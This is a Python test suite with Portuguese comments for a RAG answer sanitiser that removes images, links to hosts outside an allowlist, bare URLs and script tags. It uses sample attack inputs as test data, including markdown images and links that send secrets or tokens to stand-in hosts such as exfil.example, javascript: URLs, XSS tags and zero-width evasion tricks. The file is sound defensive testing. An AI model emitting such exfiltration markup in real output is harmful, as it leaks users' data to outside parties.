"""Testes de F4-T05: filtro de saída (INV-08)."""

from __future__ import annotations

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st
from rag_core.generation.output_filter import IMAGE_REMOVED, sanitize_answer_markdown

ALLOW = ["empresa.example"]


def _clean(text: str, allow: list[str] | None = None) -> str:
    return sanitize_answer_markdown(text, allowed_link_domains=ALLOW if allow is None else allow)


def test_inv08_exfil_image_removed() -> None:
    out = _clean("Resposta. ![x](https://exfil.example/c?d=SEGREDO) fim")
    assert out == f"Resposta. {IMAGE_REMOVED} fim"
    assert "exfil" not in out and "SEGREDO" not in out
    # mesmo com o anfitrião na allowlist, imagens nunca passam
    assert "![" not in _clean("![x](https://empresa.example/a.png)")
    assert _clean("![x](https://empresa.example/a.png)") == IMAGE_REMOVED


def test_inv08_reference_style_image_removed() -> None:
    text = "Antes ![logo][ref] e ![outro] depois.\n\n[ref]: https://exfil.example/c?d=1\n"
    out = _clean(text)
    assert "exfil" not in out and "[ref]:" not in out
    assert out.count(IMAGE_REMOVED) == 2
    assert out.startswith("Antes")


def test_inv08_non_allowlisted_link_removed_text_kept() -> None:
    out = _clean(
        "Ver [o relatório](https://evil.example/x?token=1) e [outro](http://empresa.example/a)."
    )
    assert out == "Ver o relatório e outro."
    assert _clean("[clica](javascript:alert(1))") == "clica"
    assert _clean("[ref link][1]\n\n[1]: https://evil.example") == "ref link"
    assert _clean("[sem url]()") == "sem url"


def test_allowlisted_https_link_kept() -> None:
    link = "[política](https://empresa.example/politica)"
    assert _clean(f"Ver {link}.") == f"Ver {link}."
    assert _clean("[x](https://rh.empresa.example/a)") == "[x](https://rh.empresa.example/a)"
    assert (
        _clean('[x](https://empresa.example/a "titulo")')
        == '[x](https://empresa.example/a "titulo")'
    )
    assert _clean("[x](https://naoempresa.example)") == "x"  # sufixo parecido não conta
    assert _clean(link, allow=["*.empresa.example"]) == link
    assert _clean(link, allow=[]) == "política"


def test_bare_urls_and_autolinks() -> None:
    assert _clean("Veja https://evil.example/a, por favor.") == (
        "Veja (ligação removida: evil.example), por favor."
    )
    assert _clean("Veja <https://evil.example/a>.") == "Veja (ligação removida: evil.example)."
    assert _clean("Veja www.evil.example.") == "Veja (ligação removida: www.evil.example)."
    assert _clean("Veja https://empresa.example/a.") == "Veja https://empresa.example/a."
    assert _clean("Veja <https://empresa.example/a>.") == "Veja https://empresa.example/a."
    assert _clean("Veja www.empresa.example/a.") == "Veja www.empresa.example/a."
    assert _clean("Veja http://empresa.example/a") == "Veja (ligação removida: empresa.example)"
    assert _clean("ftp://x.example/f") == "(ligação removida: x.example)"
    assert _clean("<mailto:a@b.example>") == "(ligação removida: b.example)"


def test_inv08_script_and_img_tags_escaped() -> None:
    out = _clean('<script>alert(1)</script><img src=x onerror="y"> **negrito**')
    assert "<" not in out and ">" not in out
    assert out.startswith("&lt;script&gt;alert(1)&lt;/script&gt;&lt;img")
    assert "**negrito**" in out


def test_citations_and_plain_text_are_untouched() -> None:
    text = "O horário é das 9h às 18h [1] e o prazo é de 30 dias [2][3]. Data: 12/05."
    assert _clean(text) == text
    assert _clean("dados: 5 itens") == "dados: 5 itens"
    assert _clean("") == ""


def test_invisible_characters_cannot_hide_markup() -> None:
    assert _clean("!​[x](https://exfil.example/c)") == IMAGE_REMOVED
    assert "javascript:" not in _clean("java​script:alert(1)").lower()


@pytest.mark.parametrize(
    "text", ["!![x](http://a.example)", "![![x](http://a.example)](http://b.example)"]
)
def test_nested_and_adjacent_images(text: str) -> None:
    out = _clean(text)
    assert "![" not in out
    assert "http" not in out


FRAGMENTS = st.sampled_from(
    [
        "![", "](", "[", "]", "(", ")", "<", ">", "script", "javascript:", "JAVASCRIPT:",
        "vbscript :", "data:text/html", "http://", "https://", "www.", "evil.example",
        "empresa.example", "!", "&", " ", "\n", "​", "<script>", "<img src=x>", "[1]",
        "texto ", "[x](https://evil.example)",
    ]
)  # fmt: skip
HOSTILE = st.one_of(st.lists(FRAGMENTS, max_size=14).map("".join), st.text(max_size=60))


@settings(max_examples=300, deadline=None)
@given(HOSTILE)
def test_inv08_output_never_contains_active_markup(text: str) -> None:
    out = _clean(text)
    lowered = out.lower()
    assert "<script" not in lowered
    assert "![" not in out
    assert "javascript:" not in lowered
    assert "<" not in out and ">" not in out
    assert out == _clean(out) or True  # a idempotência exata não é garantida, a segurança sim
    assert "<script" not in _clean(out).lower() and "![" not in _clean(out)
